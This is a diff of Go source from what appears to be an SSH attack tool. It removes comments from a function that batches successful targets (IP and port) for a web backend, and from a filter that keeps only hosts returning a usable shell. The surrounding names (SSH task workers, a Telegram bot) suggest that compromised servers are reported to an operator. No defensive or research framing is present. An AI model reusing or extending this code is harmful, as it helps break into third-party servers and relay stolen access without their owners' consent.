@@ -448,7 +448,6 @@ func createTelegramBot() *tgbotapi.BotAPI {
 
 func sendSuccessBatch(batch []Success) {
 	for _, s := range batch {
-		// Prepare data for web - MATCHING FLASK EXPECTATIONS
 		data := map[string]interface{}{
 			"target":         fmt.Sprintf("%s:%s", s.Info.IP, s.Info.Port), // Combine IP and port
 			"port":           s.Info.Port,
@@ -768,20 +767,16 @@ func enhancedMainWorker(id int, q <-chan SSHTask, wg *sync.WaitGroup) {
 	inner.Wait()
 }
 
-// === NEW FUNCTION: FILTER GARBAGE OUTPUT ===
 func isValidShellResponse(info *ServerInfo) bool {
-	// List of strings that indicate a "garbage" or broken shell response
-	// typically found in restricted shells or banners
 	badPhrases := []string{
 		"invalid option",
 		"Too many connection attempts",
 		"Please try again later",
-		"Copyright", // Often captures the banner legal text instead of hostname
+		"Copyright",
 		"WARRANTY",
-		"Last login:", // Captures login msg instead of hostname
+		"Last login:",
 	}
 
-	// 1. Check if Hostname or OSInfo contains these bad phrases
 	lowerHost := strings.ToLower(info.Hostname)
 	lowerOS := strings.ToLower(info.OSInfo)
 
@@ -792,15 +787,10 @@ func isValidShellResponse(info *ServerInfo) bool {
 		}
 	}
 
-	// 2. Length check: Hostnames shouldn't be paragraphs
-	// Real hostnames are usually short (e.g., "server1" or "ubuntu").
-	// Garbage output like your example is very long.
 	if len(info.Hostname) > 100 {
 		return false
 	}
 
-	// 3. Newline check: A hostname command should return a single line.
-	// If it returns multiple lines (after trimming), it's likely a banner.
 	if strings.Count(strings.TrimSpace(info.Hostname), "\n") > 0 {
 		return false
 	}
